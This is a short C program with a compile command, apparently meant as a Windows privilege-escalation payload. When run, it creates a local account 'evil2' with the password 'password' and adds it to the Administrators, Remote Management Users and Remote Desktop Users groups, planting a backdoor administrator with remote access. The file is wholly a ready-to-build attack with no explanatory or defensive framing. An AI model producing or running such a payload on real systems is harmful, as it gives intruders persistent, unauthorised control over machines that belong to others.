#include <stdlib.h>  

int main () 
 { 
    system ("net user evil2 password /add"); 
    system ("net localgroup Administrators evil2 /add");
    system ("net localgroup 'Remote Management Users' evil2 /add");
    system ("net localgroup 'Remote Desktop Users' evil2 /add");
    return 0; 
} 


/* Compile It:  x86_64-w64-mingw32-gcc adduser.c -o adduser.exe   */ 